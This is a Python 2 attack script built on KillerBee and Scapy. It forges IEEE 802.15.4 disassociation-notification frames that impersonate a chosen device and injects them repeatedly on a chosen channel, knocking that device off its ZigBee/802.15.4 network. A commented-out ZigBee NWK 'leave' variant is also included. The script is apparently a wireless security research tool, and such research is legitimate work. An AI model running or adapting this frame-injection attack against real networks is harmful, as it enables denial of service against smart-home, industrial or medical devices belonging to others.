#!/usr/bin/env python

import pdb
import binascii
import sys
import argparse
from time import sleep

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # suppress annoying Scapy IPv6 warning
from killerbee import *
from scapy.all import *

def create_orphan_mac(panid, devleave, coordinator, device, seqnum):
    '''802.15.4 Disassociation Frame'''
    b = Dot15d4()/Dot15d4Cmd()#/Dot15d4CmdPANIDConflictNotify()
    b.fcf_panidcompress = 1 # shall be set to one
    b.fcf_srcaddrmode = 3 # src shall be set to three (long addr)
    b.fcf_destaddrmode = 2 #
    b.fcf_pending = 0 # shall be set to zero
    b.fcf_ackreq = 1 # shall be set to one
    b.seqnum = seqnum
    b.dest_panid = panid # PAN to which to disassociate
    b.cmd_id = 6 # Disassociation notification
    #if devleave:
    #    b.disassociation_reason = 0x1 # The device wishes to leave the PAN
    b.dest_addr = coordinator
    b.src_addr = device
    #else:
    #    b.disassociation_reason = 0x02 # The coordinator wishes the device to leave the PAN
    #    # If coordinator wants an associated device to leave the PAN, ...
    #b.dest_addr = coordinator # extended address of the device being removed from the PAN.
    #    # If an associated device wants to leave the PAN, then the Destination Address field shall contain the coordinator address.
    #b.src_panid = hex(255) #\xff\xff #: Source PAN Identifier shall be omitted
    #b.src_addr = coordinator # coordinator or end device
    return b

#def create_disassoc_nwk(panid, devleave, coordinator, deviceshort, device, seqnum, seqnumzb):
#    '''ZigBee Leave Command Frame'''
#    z = Dot15d4()/Dot15d4Data()/ZigbeeNWK()/ZigbeeNWKCommandPayload()
#    # Dot15d4
#    z.fcf_panidcompress = 1 # TODO ?
#    z.fcf_ackreq = 1 # Acknowledgement shall be requested
#    z.fcf_frametype = 1 # "Data"
#    #z.fcf_srcaddrmode = 3 # "Long"
#    z.fcf_srcaddrmode = 2
#    #z.fcf_destaddrmode = 3 # "Long"
#    z.fcf_destaddrmode = 2
#    z.seqnum = seqnum
#    # Dot15d4Data
#    z.dest_panid = panid # PAN to which to disassociate
#    # ZigbeeNWK
#    z.frametype = 1 # command frame
#    z.flags = "extended_dst+extended_src"
#    z.radius = 1 # the radius field shall be set to 1
#    z.getlayer(ZigbeeNWK).fields['seqnum'] = seqnumzb # TODO
#    # ZigbeeNWKCommandPayload
#    z.cmd_identifier = "leave"
#    # Request Sub-Field
#    # 1: the leave command frame is a request for another device to leave the network.
#    # 0: the leave command frame is an indication that the sending device plans to leave the network.
#    if devleave:
#        z.src_addr  = deviceshort # device originates
#        z.dest_addr = 0x0000
#        z.source    = deviceshort
#        z.destination = 0x0000
#        z.ext_src = device
#        z.ext_dst = coordinator
#        z.request = 0
#    else:   # The coordinator is booting the device from the network
#        z.src_addr   = 0x0000 # coordinator originates
#        z.dest_addr  = deviceshort
#        z.source     = 0x0000
#        z.destination = deviceshort
#        z.ext_src = coordinator
#        z.ext_dst = device
#        z.request = 1
#    return z

if __name__ == '__main__':
    # Command-line arguments
    parser = argparse.ArgumentParser()
    tohex = lambda s: int(s.replace(':', ''), 16)
    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
    parser.add_argument('-i', '--interface', action='store', dest='devstring', default=None)
    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
    parser.add_argument('-s', '--coordinator', action='store', required=True, type=tohex)
    parser.add_argument('-d', '--device', action='store', required=True, type=tohex)
    parser.add_argument('-e', '--deviceshort', action='store', required=True, type=tohex)
    parser.add_argument('-q', '--srcseq', action='store', default=254, type=int)
    parser.add_argument('-z', '--srcseqzbnwk', action='store', default=254, type=int)
    parser.add_argument('--devleave', action='store_true', default=False, help="Define this flag to pretend to be an end device requesting to leave the network.")
    parser.add_argument('--zblayer', action='store_true', default=False, help="Define this flag to produce a ZigBee NWK layer diassocation request, instead of an 802.15.4 MAC layer request.")
    parser.add_argument('--numloops', action='store', default=1, type=int)
    args = parser.parse_args()

    print("Expecting {2:#016x} to be the coordinator on network (PAN ID) {0:#04x}, located on channel {1}.".format(args.panid, args.channel, args.coordinator))
    print("The device to disassociate is {0:#016x} with short address {1:#04x}.".format(args.device, args.deviceshort))
    #TODO seqnums for each direction

    kb = KillerBee(device=args.devstring)
    kb.set_channel(args.channel)

    # For both disassociate request types (initiated by coordinator or device) the ACK frame confirms it
    seqnummac = args.srcseq
    for loopnum in range(0, args.numloops):                       #device
	sp = create_orphan_mac(args.panid, args.devleave, args.coordinator, args.device, seqnummac)
        seqnummac += 1
        if seqnummac > 255:
            seqnummac = 0
        print sp.summary()
        kb.inject(str(sp))
        sleep(0.005)

# EOF
